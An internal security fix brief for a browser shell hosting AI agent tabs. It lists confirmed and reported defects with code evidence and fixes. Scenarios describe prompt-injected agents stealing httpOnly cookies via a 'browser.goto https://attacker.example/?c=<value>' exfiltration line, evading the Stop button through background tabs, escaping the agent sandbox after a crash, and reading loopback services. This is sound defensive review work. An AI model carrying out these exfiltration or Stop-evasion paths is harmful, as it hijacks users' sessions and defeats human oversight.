# Fix brief: G1a-chrome-shell

Lane: product. Items: 13. Files this group owns: `powerbrowser/shell/PowerBrowserAPI.sys.mjs`, `powerbrowser/shell/GroupActorChild.sys.mjs`, `powerbrowser/INTERNAL-APIS.md`, `^theia/extensions/tab-uris/` (pattern), `^theia/extensions/chrome-bar/` (pattern), `docs/URI-SCHEMES.md`.

Item IDs: agent-browser-03; agent-browser-04; chrome-actor-03; agent-browser-02 = chrome-actor-02 = 66-CR-01; 59-WR-02; 59-WR-01; 59-WR-03; 59-WR-05; 66-WR-06; agent-browser-06; chrome-actor-04; chrome-actor-05; chrome-actor-06.

## agent-browser-03: All agents share one persistent container, and cookie.get returns httpOnly session cookies of any host

- **Severity:** medium
- **Verdict:** CONFIRMED
- **Location:** `powerbrowser/shell/PowerBrowserAPI.sys.mjs:11488`

**What is wrong.** agentContainerId creates one 'PowerBrowser Orca agents' container and reuses it for every agent tab of every worktree and session. Its cookies persist across launches. browser.cookie.get with no url returns every cookie in that container, and with a url returns that host's cookies, including httpOnly ones, with their values. browser.cookie.set accepts any domain. A session the user logs into in an agent tab (for example when an agent asks them to sign in), or that another agent established, is therefore readable and replaceable by any later agent that a page prompt-injects. The agent can then send the values off the machine with browser.goto or browser.eval.

**Scenario.** The user signs in to a code-hosting site in an agent tab so agent A can work there. Days later agent B, in another worktree, reads a hostile page that tells it to run `browser cookie get`. handleWebTabAgent -> agentCookieGet -> getCookiesWithOriginAttributes('{"userContextId":N}') returns the session cookie value with httpOnly:true. The agent then runs browser.goto https://attacker.example/?c=<value>, and the attacker takes over the session.

**Preconditions.** A session cookie exists in the agent container (a user sign-in in an agent tab, or one made by an earlier agent), and an agent is prompt-injected.

**Evidence.** PowerBrowserAPI.sys.mjs:11252-11260 `const stored = Services.prefs.getIntPref(AGENT_CONTAINER_PREF, 0); if (stored > 0 && ...) return stored; const identity = lazy.ContextualIdentityService.create("PowerBrowser Orca agents", ...)`; :11488-11490 `const cookies = host ? Services.cookies.getCookiesFromHost(host, attrs) : Services.cookies.getCookiesWithOriginAttributes(JSON.stringify(attrs)); return agentDone({ cookies: cookies.map(c => ({ name: c.name, value: c.value, ... httpOnly: c.isHttpOnly ...`; :11495 `const host = params.domain || agentHostOf(entry, null);`.

**Suggested fix.** Scope cookie rows to the current page's site (refuse a url or domain that is not the tab's current base domain), or leave out httpOnly values. Consider one container per worktree or per page that is cleared when the page closes, and tell the user that sign-ins made in agent tabs are kept and shared across agents.

**Verifier (CONFIRMED, medium).** agentContainerId (PowerBrowserAPI.sys.mjs:11252-11265) reads the stored id from the pref powerbrowser.orca.agentUserContextId and reuses it whenever ContextualIdentityService still knows it. A new container is made only when the user removes the old one. webTabOpen (:3588) calls it for every agent tab, so every agent of every worktree and every launch shares one cookie jar. No code clears that jar at quit or at start: a grep finds no removeCookiesWithOriginAttributes or removeIdentity for it. agentCookieGet (:11482-11492) takes any params.url, so the host is the agent's choice and need not be the current page. It returns every cookie in the container when url is absent, and it maps value and httpOnly through unfiltered. agentCookieSet (:11494-11505) passes params.domain straight to Services.cookies.add. The validator (:11158-11159) checks only the types. The wall (agentWallVerdict :11202) checks owner, the agent flag and the container, and none of those limit which hosts' cookies come back. browser.goto passes any https URL (:11624 -> webTabNavigate :4147), so the stolen value can leave the machine through a query string. The user can sign in to a site inside an agent tab, because it is an ordinary visible web tab. Point (4): a prompt-injected agent could already act inside the session while it runs, but it could not read an httpOnly value with page script. Taking that value off the machine gives the attacker persistent access with no agent involved, so the precondition does not already grant what is gained. Upstream Orca derives a per-route partition (orca/src/main/browser/browser-route-identity.ts:39), so PB's single shared jar is wider than upstream. No owner decision accepts this. D-41 accepts other agent-tab risks only. *Checked at:* PowerBrowserAPI.sys.mjs:11254-11256 reuses the stored container. :11484-11490 returns any host's cookies, httpOnly included, with values. :11495 uses the caller's domain. :4147 checks only the scheme for the exfiltration goto. No guard found.

## agent-browser-04: Stop ends control of one tab only; the agent keeps acting through new background tabs, and Stop is hidden while the mark is idle

- **Severity:** medium
- **Verdict:** CONFIRMED
- **Location:** `powerbrowser/shell/PowerBrowserAPI.sys.mjs:11811`

**What is wrong.** handleWebTabAgentStop sets stopped on one webTabs entry. The Theia dispatcher keeps no stopped state, so the next createPage from orcad (browser.tabCreate / openUrl) opens a new agent tab in the background through openAgentTab, and every automation method works there. The chrome bar shows the mark and its Stop button only while agentControl.active is true. That flag is lit by a served automation call and clears after 20 s idle. It is never lit by the `navigate` page command, which loads the agent's chosen URL in the new tab. So the user cannot stop an agent before it acts, and Stop does not stop the agent.

**Scenario.** The user sees the mark on tab A and presses Stop. Agent calls on A now answer browser_owner_unavailable. The prompt-injected agent runs `orca browser tab create --url https://target`. orcad sends createPage then navigate. dispatchCommand opens tab B behind the user's current tab and navigates it, with no mark lit, and then drives B with click and fill. The user sees B's mark only by switching to B.

**Preconditions.** An agent keeps running after the user presses Stop, as a prompt-injected agent will.

**Evidence.** PowerBrowserAPI.sys.mjs:11809-11811 `const control = agentControlOf(entry); const wasStopped = control.stopped; control.stopped = true;` (per entry); orca-browser-dispatch.ts:123-133 createPage opens a tab whatever the state of other tabs; orca-browser-frontend-module.ts:374-382 openAgentTab; web-tab.ts:1817-1820 `openAgentTab ... Never activated`; chrome-bar-widget.tsx:1687-1689 `if (!currentWebTab()?.agentControl.active) { return undefined; }`; orca-browser-dispatch.ts:148-150 navigate goes to webTabNavigate, which never calls agentSetActive.

**Suggested fix.** Make Stop end the browser host for that agent or worktree: record the stop in OrcaBrowserHost (by workspaceId, or for the whole host), refuse later createPage, navigate and automation with browser_owner_unavailable until the user resumes, and show the mark whenever a tab is an agent tab, not only while active.

**Verifier (CONFIRMED, medium).** handleWebTabAgentStop (PowerBrowserAPI.sys.mjs:11797-11827) sets stopped on that one entry's agentControl only. agentWallVerdict (:11209) consults the flag only for that entry. On the Theia side, dispatchCommand's createPage branch (orca-browser-dispatch.ts:123-133) checks only whether the page id is already bound. No stopped state exists anywhere in the dispatcher or in OrcaBrowserHost.deps (orca-browser-frontend-module.ts:371-392). So a new createPage opens a fresh agent tab through openAgentTab (web-tab.ts:1817-1821), which never activates it, and every automation method works there. The `navigate` page command goes to widget.navigate, then the group mutation webTabNavigate (PowerBrowserAPI.sys.mjs:2816-2820), then webTabNavigate (:4145-4169). None of these calls agentSetActive or checks stopped. So the mark is not lit by the first navigation, and navigate still works even on the tab that was stopped. The mark is lit only by handleWebTabAgent (:11769) and cleared 20 s after the last call (:11695-11698). The chrome bar renders the mark and Stop only for the current tab while active is true (chrome-bar-widget.tsx:1687-1689), so a background tab B has no Stop the user can see. Stop being per-tab is the stated design (P66-22, D-19). No owner decision accepts the risk that Stop does not stop the agent. *Checked at:* PowerBrowserAPI.sys.mjs:11811 sets stopped per entry only. orca-browser-dispatch.ts:123-133 has no stopped check on createPage. PowerBrowserAPI.sys.mjs:2816-2820 and :4145 have no stopped check on navigate. chrome-bar-widget.tsx:1687 shows the mark only while active.

## chrome-actor-03: The chrome sender wall admits Orca's third-party renderer bundle, which runs in the Theia document, so any script in it reaches every privileged kind

- **Severity:** medium
- **Verdict:** PLAUSIBLE
- **Location:** `powerbrowser/shell/PowerBrowserAPI.sys.mjs:319`

**What is wrong.** groupSenderIsTheia authenticates a document: the shell's content browser, the sidecar port, and 127.0.0.1/localhost. v1.7 loads Orca's pane bundle (Orca's React renderer, which shows agent chat output, terminal content and repository data) into that same document (orca-pane-bundle.ts: 'loads the Orca pane bundle into the Theia document'). Every PowerBrowserGroupMutation kind therefore trusts Orca's renderer code as much as PowerBrowser's own frontend. That includes the store kinds such as readClipboardText, which INTERNAL-APIS says is 'sent only from address-bar.tsx after the user chose one' but which chrome cannot enforce. It also includes webTabOpen of any http(s) URL in the user's container, webTabAgent on every agent tab, openStockTab, shellStateSave, restartToUpdate and orcaRestart. A script-injection flaw in Orca's renderer (for example markdown or HTML from a prompt-injected agent's output) becomes code in the privileged channel's trusted document. PowerBrowser relies on upstream Orca's renderer being free of injection for this boundary to hold.

**Scenario.** A prompt-injected agent emits chat output that triggers an HTML-injection flaw in Orca's chat renderer at the pinned tag. The injected script runs in the Theia document and dispatches `new CustomEvent('PowerBrowserGroupRequest', {detail:{requestId:'x', msg:{kind:'readClipboardText'}}})`. PowerBrowserGroupChild forwards it, groupSenderIsTheia passes, and chrome returns the system clipboard text. The same script can open user-container tabs or drive agent tabs.

**Preconditions.** Script execution inside the Theia document through Orca's renderer: an injection flaw in Orca's views reachable from agent or repository content, or a compromised Orca re-pin.

**Evidence.** PowerBrowserAPI.sys.mjs:319-349 groupSenderIsTheia checks only `embeddedByPrimary && embeddedByShell && port === groupSenderPort && groupSenderSpecIsTheia(spec)`. PowerBrowserAPI.sys.mjs:4552-4557 routes every kind (shell, store, web-tab action, group mutation) after that document check only. PowerBrowserAPI.sys.mjs:4701-4702 `case "readClipboardText": { return { ok: true, kind, text: readClipboardText() }; }`. orca-pane-bundle.ts header: 'loads the Orca pane bundle into the Theia document and boots it once'. The 64 threat register lists T-64-12 'Orca code in the authenticated document | medium | accept', and owner item T-61-04 is still open in STATE.md.

**Suggested fix.** Host the Orca bundle in a separate origin or frame that the PowerBrowserGroup actor does not match (Route B'), or add a per-kind capability that Orca code cannot reach. For example, keep the privileged kinds (clipboard read, save paths, update/restart, user-tab open) on a nonce or MessagePort handed only to PB's own modules at startup, before the Orca bundle loads. At minimum, record T-61-04 as an owner decision.

**Verifier (PLAUSIBLE, medium).** The architecture is as described. groupSenderIsTheia (PowerBrowserAPI.sys.mjs:319-349) authenticates a document: the shell's content browser, the sidecar port and the Theia spec. PowerBrowserGroupParent.receiveMessage (4545-4557) routes the shell, store, web-tab action and group mutation kinds after that check, and readClipboardText (4701-4702) returns the clipboard with no further check. OrcaPaneBundle.loadEntry (orca-pane-bundle.ts:122-147) imports Orca's renderer bundle into that same Theia document through an inline module script. I found no Content-Security-Policy in theia/extensions, and the inline loader itself implies none forbids inline script. Any script running in Orca's views therefore holds every privileged kind. The step I cannot settle statically is whether Orca's renderer at the pinned tag has an HTML or script injection flaw that agent or repository content can reach. The finding assumes one and does not demonstrate it. The owner accepted T-64-12 ('Orca code in the authenticated document', medium, accept; 64-02-PLAN.md:312), and T-61-04 is still open. That acceptance does not refute the finding. *Checked at:* Unverified runtime step: an injection flaw in Orca's renderer (chat, terminal or repository views). No CSP was found in theia/extensions, so no guard blocks injected script once such a flaw exists.

## agent-browser-02 = chrome-actor-02 = 66-CR-01: An agent tab recreated after a crash or lost view reopens without the agent flag, in the user's cookie jar and outside every agent wall

- **Severity:** medium
- **Verdict:** CONFIRMED
- **Location:** `theia/extensions/tab-uris/src/browser/web-tab.ts:1304`

**What is wrong.** WebTabWidget sends the agent flag only on the first webTabOpen (agentOpenSent). recreate() for a crashed tab and reopen() for a lost view both call webTabClose and then webTabOpen without `agent`. Chrome treats that as a new overlay with agent=false. The new overlay is in the 'browsers' message manager group (login manager and autocomplete attached), uses the user's default container (no usercontextid), and has neither SANDBOXED_AUXILIARY_NAVIGATION nor SANDBOXED_DOWNLOADS. It gets no protocol or clipboard wall. Chrome keeps the crashed tab's session history and restores it, so the agent's page (possibly hostile) loads again in the user's logged-in context. The Theia page table still binds the tab to the Orca page, so reportMetadata keeps sending the user's later URLs and titles in that tab to orcad.

**Scenario.** A hostile page that an agent opened allocates memory until its content process crashes. The user (or anything else) presses Reload, Back or Forward on the crashed agent tab. web-tab.ts reload() -> recreate() -> reopen() sends {kind:'webTabOpen', tabId, url, key} with no agent field. PowerBrowserAPI.webTabOpen creates a plain overlay in container 0, and restoreWebTabHistory reloads the hostile URL. The page now runs with the user's cookies (credentialed requests, login autofill) and may open popups, downloads and external protocols that D-35, D-37 and D-38 refuse for agent pages. Its URL and title changes reach orcad and the agent through pageMetadata.

**Preconditions.** An agent tab's content process crashes (a page can force this by exhausting memory), or its view is lost, and then Reload, Back, Forward or a history jump runs on it.

**Evidence.** web-tab.ts:984-986 `const agent = this.agent && !this.agentOpenSent; this.agentOpenSent = true; ... ...(agent ? { agent: true as const } : {})`; web-tab.ts:1294-1305 `protected async recreate() { await this.channel.request({ kind: 'webTabClose', ... }); return this.reopen(); } ... reopen() { const reply = await this.channel.request({ kind: 'webTabOpen', tabId: this.tabId, url: this.url, key: this.rowKey });`; PowerBrowserAPI.sys.mjs:3577 `webTabOpen(..., pending = null, agent = false)`, :3592 `const userContextId = agent === true ? agentContainerId() : 0;`, :3632-3634 `if (agent === true) { agentTabCreated(entry, userContextId); }`, :3640-3654 history restore; orca-browser-frontend-module.ts:441-451 reportMetadata for any bound tabId.

**Suggested fix.** Make the agent flag a property of the tab id in chrome: record agent tab ids in a set that webTabClose does not clear, and have webTabOpen apply agentTabCreated whenever the id is in that set, whatever the frontend sends. Also pass `agent: this.agent` from reopen(). Otherwise refuse recreate and reopen for agent widgets (close the tab and report a user close).

**Verifier (CONFIRMED, medium).** I traced the path myself and it is as described.

Frontend side:
- web-tab.ts:984-986 sends `agent: true` only while `agentOpenSent` is false, and sets it true on the first attach.
- reopen() at web-tab.ts:1304-1305 sends `{kind:'webTabOpen', tabId, url, key}` and never carries `agent`.
- recreate() (1294-1297) sends webTabClose and then calls reopen().
- Five actions reach recreate() on a crashed tab: navigate (1216), back (1225), forward (1232), gotoIndex (1255) and reload (1272). Reload on a lost view goes straight to reopen() (1269-1270, 1281-1282).
- The crash UI tells the user to do this: CRASHED_COPY at web-tab.ts:74 reads "This tab crashed. Reload to try again."

Chrome side:
- webTabClose (PowerBrowserAPI.sys.mjs:4225-4277) keeps the crashed tab's history armed under its rowKey (4234-4235, keepCrashedWebTabHistory at 846-857) and then runs webTabs.delete(tabId). webTabOpen's "already-open" branch (3582) therefore does not fire.
- The handler at 2797-2802 passes `data.agent === true`, which is false here. So userContextId is 0 (3588), the agent attribute override at 3620 is not applied (messagemanagergroup "browsers", PopupAutoComplete), and agentTabCreated is skipped (3655-3657). That skip means no SANDBOXED_AUXILIARY_NAVIGATION or SANDBOXED_DOWNLOADS (11273), and no protocol wall or focus guard install.
- rowKey always exists (web-tab.ts:883; chrome 3699), so takeWebTabHistory (3662) returns the kept history. restoreWebTabHistory (3664) reloads the current entry. If the restore rejects, the code falls back to webTabNavigate(tabId, spec), and spec is this.url, which tracks the page's URL through the state push at web-tab.ts:1565. Either way the hostile URL loads in container 0.
- One step depends on runtime behaviour: whether restoring entries whose serialized triggering principals carry the agent container's userContextId into a container-0 docshell loads cleanly or silently loads nothing. Both of the code's own branches send the URL into the default container.

What gates the open:
- The frontend only checks tabId shape, key shape and that the agent flag is true or absent. No guard re-derives agent status for a reused tabId or rowKey.
- closeStaleAgentTabs (orca-browser-frontend-module.ts:432-438) only runs for widgets whose page is unbound. Here the tab is still bound, so reportMetadata (441-451) keeps sending the tab's later url and title to orcad as pageMetadata.

Preconditions:
- A page can plausibly crash its own content process by exhausting memory.
- The user then has to press Reload, Back or Forward, or type a URL. The crash UI invites exactly that.
- None of this requires already holding the capability gained.

Why medium and not high:
- The page now runs as an ordinary page in the user's default container. A hostile origin gets its own cookies, its own saved-login autofill, popups, downloads and protocol prompts. Any site the user visits directly gets the same.
- So the crossing is the loss of the Orca agent isolation walls (P66-26 container, D-35, D-37 and the protocol wall), not a new capability over other origins.
- Agent control is lost too: agentWallVerdict at 11206 refuses the new entry because entry.agent is not true. The agent cannot drive the page in the user's context.
- What leaks is privacy: the user's later URLs and titles in that tab go to orcad and the agent.
- That is a defence-in-depth gap with a concrete path, plus a user-visible correctness bug: an agent tab silently becomes a user tab. *Checked at:* theia/extensions/tab-uris/src/browser/web-tab.ts:984-986 (flag only on first open) and :1305 (reopen sends no agent); powerbrowser/shell/PowerBrowserAPI.sys.mjs:4275 (webTabs.delete makes the reopen a fresh create), :3588 (userContextId 0 when agent false), :3620 (agent attribute override skipped), :3655-3657 (agentTabCreated skipped, so no sandbox flags from :11273), :3662-3674 (kept history restored or URL navigated in container 0); orca-browser-frontend-module.ts:441-451 (metadata still reported for the bound tabId)

---

**Second report of the same defect (chrome-actor-02).**

**What is wrong.** WebTabWidget sends the agent flag only on the first webTabOpen (agentOpenSent). recreate() (the crash path, reached from navigate/back/forward/reload/gotoIndex when this.crashed) and reopen() (the lost-view Reload) close the overlay and send webTabOpen without `agent`. Chrome then builds an ordinary overlay: usercontextid 0 (the user's cookie jar), messagemanagergroup 'browsers' (login manager autofill and capture), autocomplete popup, the WebExtensions tab-host node, and no sandbox flags, so popups, downloads and external protocols are allowed. There is also no clipboard wall (the PowerBrowserAgentPage pair is agent-group only). The Theia widget still has agent=true and stays bound to the Orca browserPageId, so Orca's navigate command (see the previous finding) can keep sending this user-context tab to any http(s) URL. That breaks T-66-11's invariant that an agent overlay loads in the Orca-agent container and never the user's, and it bypasses D-35, D-37 and D-38 for that tab.

**Scenario.** An agent page exhausts its content process's memory, or the agent, which has a shell under D-12, kills that content process. Either way the agent tab is marked crashed. The agent then issues an Orca navigate to https://victim.example/action?x=1, or Orca's page recovery re-navigates. widget.navigate sees this.crashed and calls recreate(), which sends webTabClose and then webTabOpen without the agent flag. Chrome loads the agent-chosen URL in the user's default container with the user's Lax/None cookies attached. Later navigations to download URLs or to pages that redirect to an external protocol are no longer refused.

**Preconditions.** The agent tab's content process crashes (any page can force an OOM, and an agent with a shell can kill the pid), or the open reply times out. Then a navigate, back, forward or reload reaches the widget, from the agent's navigate command, Orca recovery or the user.

**Evidence.** web-tab.ts:984-986 `const agent = this.agent && !this.agentOpenSent; this.agentOpenSent = true; ... ...(agent ? { agent: true as const } : {})`; web-tab.ts:1216-1217 `if (this.crashed) { return this.recreate(); }`; web-tab.ts:1294-1296 `recreate() { await ...webTabClose...; return this.reopen(); }`; web-tab.ts:1305 `this.channel.request({ kind: 'webTabOpen', tabId: this.tabId, url: this.url, key: this.rowKey })` (no agent field). PowerBrowserAPI.sys.mjs:3588 `const userContextId = agent === true ? agentContainerId() : 0;` and 3613 `messagemanagergroup: "browsers"` apply when agent is false. agentTabCreated (sandboxFlags) runs only when `agent === true` (3655).

**Suggested fix.** Make the agent flag a property of the widget for its whole life: send `agent: true` on every webTabOpen for a widget with this.agent (recreate and reopen included). As a second wall, have chrome remember agent tabIds after webTabClose (or key by rowKey) and refuse a non-agent webTabOpen for a tabId that was an agent tab.

**Verifier (CONFIRMED, medium).** The core claim holds. web-tab.ts:984-986 sends agent:true only on the first webTabOpen (agentOpenSent). recreate() (web-tab.ts:1294-1297) and reopen() (web-tab.ts:1304-1305) send webTabOpen with no agent field. recreate() is reached from navigate, back, forward, gotoIndex and reload whenever this.crashed is set. The crash state comes from the generic oop-browser-crashed listener (PowerBrowserAPI.sys.mjs:5760-5766), which is attached to every overlay, agent overlays included. recreate() first sends webTabClose, which deletes the webTabs entry (4275), so the next webTabOpen takes the non-agent branch: userContextId 0 (3588), messagemanagergroup 'browsers' and PopupAutoComplete (3613-3614), and no agentTabCreated, so no sandbox flags, download wall or protocol wall (3655). The URL is this.url, which tracks the page's pushed URL (web-tab.ts:1565). Kept crash history is also restored into the user-container overlay (3662-3667). The overlay then loads the agent's last page or pages in the user's cookie jar, with the D-35, D-37 and D-38 walls gone. The trigger is concrete: any page can crash its content process, and the user then presses the crash placeholder's Reload button (web-tab.ts:949) or Back/Forward. The finding's agent-driven continuation is not reachable. orcad sends no 'navigate' to an existing bound page (see chrome-actor-01). The re-created entry has no agent flag, so agentWallVerdict (11206) answers not-agent-tab and the agent loses control of the tab. The impact is therefore that agent-chosen URLs load once, on a user action, in the user's container, outside the agent walls. The agent cannot steer the tab after that. *Checked at:* web-tab.ts:1305 `this.channel.request({ kind: 'webTabOpen', tabId: this.tabId, url: this.url, key: this.rowKey })` has no agent field. PowerBrowserAPI.sys.mjs:3588 sets userContextId to 0 when agent is false. 3655 runs agentTabCreated only when agent === true. 5760 sets crashed for every overlay. The agent-control step is blocked by agentWallVerdict at 11206, because entry.agent is unset.

---

**Per-phase review report of the same defect (66-CR-01).**

*Section CR-01 of `.planning/workstreams/orca/phases/66-powerbrowser-web-tabs-as-orca-s-browser/66-REVIEW.md`, verbatim:*

**File:** `theia/extensions/tab-uris/src/browser/web-tab.ts:773-774, 984-986, 1294-1305`

**Issue:** The `agent` flag is sent only on the first `webTabOpen` (`agentOpenSent`). Later opens never carry it:

- `reopen()` (line 1305) sends `{ kind: 'webTabOpen', tabId, url, key }`. It is reached through `recreate()` from
  `navigate`, `back`, `forward` and `reload` on a crashed tab (lines 1217, 1226, 1233, 1256, 1273).
- Any later `onAfterAttach` also sends it without the flag, for example after the tab is moved to another dock area.

`recreate()` first sends `webTabClose`, so chrome's `webTabOpen` (`PowerBrowserAPI.sys.mjs:3582-3591, 3653-3657`) no
longer finds the tab and creates a new overlay. Because `agent` is false, that overlay gets `userContextId` 0 (the
user's cookie jar), the default message manager group and no `agentTabCreated()`. That means:

- no D-35 auxiliary-navigation sandbox and no D-37 download wall;
- no D-38 clipboard pair and no mark;
- no coverage by Stop.

NG-034 also restores the agent tab's history into it by row key. The Orca page binding survives. The dispatcher sends
Orca's `navigate` command through `widget.navigate()` (`orca-browser-frontend-module.ts:385`), not through the
agent-checked `webTabAgent` path, so the agent can still load any URL in that tab under the user's cookies.

The same thing happens when the first open fails. Chrome returns `unavailable` when the agent container cannot be
created (`PowerBrowserAPI.sys.mjs:3589-3591`, "no container, no tab"). The next open of the widget then creates a
user overlay.

The comment at line 181-183 says chrome honours the flag only at creation. That makes it safe, and required, to send
the flag on every open of an agent widget.

**Fix:**
```ts
// web-tab.ts: drop agentOpenSent; every open of an agent widget carries the flag (chrome ignores it on an open tab).
const agentFlag = (): { agent?: true } => (this.agent ? { agent: true as const } : {});
// onAfterAttach
void this.channel.request({ kind: 'webTabOpen', tabId: this.tabId, url: this.url, key: this.rowKey, ...(grant ? { grant } : {}), ...agentFlag() })
// reopen()
const reply = await this.channel.request({ kind: 'webTabOpen', tabId: this.tabId, url: this.url, key: this.rowKey, ...agentFlag() });
```
Also send Orca's `navigate` for a bound page through a chrome path that checks `entry.agent`, or refuse it when
chrome reports `not-agent-tab`, so a tab that is not an agent tab can never be driven by the dispatcher.

## 59-WR-02: Agent element rows read the box before a smooth scroll lands, and fail on pages with scroll-behavior: smooth

- **Severity:** warning (not refutation-checked)
- **Verdict:** REPORTED
- **Location:** `powerbrowser/shell/GroupActorChild.sys.mjs`

*Section WR-02 of `.planning/workstreams/orca/phases/59-carry-forward-from-v1-5-and-v1-6/59-REVIEW.md`, verbatim:*

**File:** `powerbrowser/shell/GroupActorChild.sys.mjs:251` (also `:535`)
**Issue:** `agentCentre` calls `element.scrollIntoView({ block: "center", inline: "center" })` and then immediately reads `getBoundingClientRect()` and runs `elementFromPoint`. Without `behavior`, the call uses `auto`, which honours CSS `scroll-behavior`. A page with `:root { scroll-behavior: smooth }` (Bootstrap 5's reboot sets it under `prefers-reduced-motion: no-preference`) therefore scrolls asynchronously. The rect is the pre-scroll one, so the hit test misses (often `null` off-viewport), and click, dblclick, hover and drag answer `browser_element_not_interactable` for any element that was off-screen.
**Fix:** `element.scrollIntoView({ block: "center", inline: "center", behavior: "instant" });` here and in the `browser.scrollIntoView` row.

## 59-WR-01: The 59-09 text-field edit route throws in agent overlays, so Undo, Redo, Delete and Select All fail there

- **Severity:** warning (not refutation-checked)
- **Verdict:** REPORTED
- **Location:** `powerbrowser/shell/PowerBrowserAPI.sys.mjs`

*Section WR-01 of `.planning/workstreams/orca/phases/59-carry-forward-from-v1-5-and-v1-6/59-REVIEW.md`, verbatim:*

**File:** `powerbrowser/shell/PowerBrowserAPI.sys.mjs:9061` (also `:10978`, `:10035`)
**Issue:** On a text field, `pageMenuEdit` now calls `global.getActor(EDIT_STATE_ACTOR_NAME)`. That actor is registered with `messageManagerGroups: ["browsers"]` (`:10035`). Phase 66 agent overlays are created in `"powerbrowser-orca-agent"` (`:3620`, `:11127`). The stock `ContextMenu` actor has no group restriction (`upstream/browser/components/DesktopActorRegistry.sys.mjs:416-428`). `installPageContextMenu` keeps the capture for any shown overlay (`overlayShownToUser`), agent tabs included. So when a user right-clicks a text field in an agent tab they are viewing, the Theia page menu opens. Picking Undo, Redo, Delete or Select All then throws NotSupportedError from `getActor`, and the error is caught at `:8787-8789` and returned as "the page menu row failed". Before 59-09 these rows went through the group-agnostic `Controllers` actor and worked. `pageEditTargetCommands` (`:10978`) also throws there and silently falls back to the cached state.
**Fix:** Keep the Controllers route when the edit-state actor is unavailable:
```js
const edit = data.context.onTextInput && data.browser.getAttribute("messagemanagergroup") === "browsers";
edit ? global.getActor(EDIT_STATE_ACTOR_NAME).sendAsyncMessage("PowerBrowserEditState:Do", { cmd })
     : global.getActor("Controllers").doCommand(cmd);
```
Alternatively, exclude agent overlays from the page menu if D-38 intends no edit rows there, and record which.

## 59-WR-03: The result budget is enforced for images, PDF and snapshot only, not for the other child or native rows

- **Severity:** warning (not refutation-checked)
- **Verdict:** REPORTED
- **Location:** `powerbrowser/shell/PowerBrowserAPI.sys.mjs`

*Section WR-03 of `.planning/workstreams/orca/phases/59-carry-forward-from-v1-5-and-v1-6/59-REVIEW.md`, verbatim:*

**File:** `powerbrowser/shell/PowerBrowserAPI.sys.mjs:11793`; `powerbrowser/shell/GroupActorChild.sys.mjs:406`, `:422-424`, `:650-653`
**Issue:** `AGENT_RESULT_MAX_BYTES` (`:11246`) is documented as the limit above which orcad rejects a result (Pitfall 4). The budget is checked in only three places: `agentEncodeImage`, `agentPdf` and the child's snapshot (`SNAP_MAX_BYTES`). These rows return unbounded payloads:

- `browser.eval` (any `String(v)` or `JSON.stringify(v)`);
- `browser.exec get html` and `get text` (whole-page `innerHTML` or `innerText`);
- `browser.console` (up to 1000 rows of unbounded text);
- `browser.network`;
- `browser.cookie.get`.

`handleWebTabAgent` returns them as-is at `:11793`. On a large page, orcad rejects the reply, so the agent gets a transport-level failure instead of a classified `browser_error`.
**Fix:** Measure once in `handleWebTabAgent` before replying:
```js
if (outcome.where === "done" && new TextEncoder().encode(JSON.stringify(outcome.result ?? null)).length + 64 > AGENT_RESULT_MAX_BYTES) {
  outcome = agentFailed("browser_error");
}
```

## 59-WR-05: The top-tab side header now never overflows, and its comment says a row cannot overflow when it clips

- **Severity:** warning (not refutation-checked)
- **Verdict:** REPORTED
- **Location:** `theia/extensions/chrome-bar/src/browser/side-panel-top-tabs.ts`

*Section WR-05 of `.planning/workstreams/orca/phases/59-carry-forward-from-v1-5-and-v1-6/59-REVIEW.md`, verbatim:*

**File:** `theia/extensions/chrome-bar/src/browser/side-panel-top-tabs.ts:30-31`
**Issue:** `hideOverflowingTabs` is stubbed to return `-1`, which fixes WINDOWS 41's TypeError. The removed comment recorded the remaining limitation as a `shortcut:` debt marker: surplus icons are clipped, so add a horizontal overflow if the views grow. The new comment states "a row never overflows". The CSS (`side-panel-top-tabs.css`: bar `min-width: 0`, tabs fixed at 32px plus 2px margin) clips any icon past the header width. A side panel can be dragged down to Lumino's minimum (the 100 px case in the round 3 debug), and below about 34 px per view the trailing views have no reachable icon and no overflow menu. The defect marker is gone, and the comment claims the opposite of the behaviour.
**Fix:** Restore a `shortcut:` marker that states the clipping. Better, give the row a real overflow: `overflow-x: auto` on `.pb-side-header .lm-TabBar-content`, or a "more" menu built from `bar.titles` past the visible width.

## Info

## 66-WR-06: createPage reports completed before, and regardless of, chrome creating the agent overlay

- **Severity:** warning (not refutation-checked)
- **Verdict:** REPORTED
- **Location:** `theia/extensions/tab-uris/src/browser/web-tab.ts`

*Section WR-06 of `.planning/workstreams/orca/phases/66-powerbrowser-web-tabs-as-orca-s-browser/66-REVIEW.md`, verbatim:*

**File:** `theia/extensions/tab-uris/src/browser/web-tab.ts:1817-1821`;
`theia/extensions/orca-browser/src/browser/orca-browser-frontend-module.ts:374-382`

**Issue:** `openAgentTab` returns once the widget is added. The `webTabOpen` reply is consumed inside `onAfterAttach`
and only feeds `setLostView`. When chrome answers `unavailable` (no agent container,
`PowerBrowserAPI.sys.mjs:3589-3591`), `refused-scheme`, or times out, orcad is still told the page was created.
Every later command then fails `browser_tab_not_found` (`unknown-tab`). Combined with CR-01, the next open of that
widget creates a user overlay.

**Fix:** Expose the first open's reply on the widget (for example `readonly opened: Promise<WebTabReply>`). Have
`openAgentTab` await it, and fail createPage (`browser_error`) and close the widget unless `where` is `opened` or
`loading`.

## agent-browser-06: The agent navigation wall checks the scheme only: loopback and LAN http services are reachable

- **Severity:** low
- **Verdict:** CONFIRMED
- **Location:** `powerbrowser/shell/PowerBrowserAPI.sys.mjs:4147`

**What is wrong.** browser.goto (agentUrl -> webTabNavigate) and the navigate page command admit any http(s) URL. Each request is checked once, and redirects are not re-checked. The scheme wall correctly blocks file:, chrome:, about:, resource:, moz-extension:, view-source:, data: and javascript:. Hosts are not checked, so an agent can load 127.0.0.1 services (orcad's port, local dev servers, other users' loopback services) and LAN admin pages, and read them with snapshot or eval. The Theia sidecar is protected only because its token cookie is in the user's container, not the agent's.

**Scenario.** A hostile page tells the agent to open http://127.0.0.1:<port>/ of an unauthenticated local service, or http://192.168.1.1/. The agent reads the content with browser.snapshot and sends it to the attacker with goto.

**Preconditions.** A loopback or LAN http service that is reachable without credentials the agent container lacks.

**Evidence.** PowerBrowserAPI.sys.mjs:4146-4149 `if (spec !== "about:blank" && !/^https?:\/\//i.test(spec)) { return "refused-scheme"; }`; :11624 `"browser.goto": ... PowerBrowserAPI.webTabNavigate(tabId, agentUrl(params.url))`.

**Suggested fix.** Refuse the sidecar's and orcad's own loopback ports for agent overlays (from OrcaService and TheiaService state), and consider a user-confirmed allow list for private-address targets, checked again on redirects (http-on-modify-request already sees agent channels).

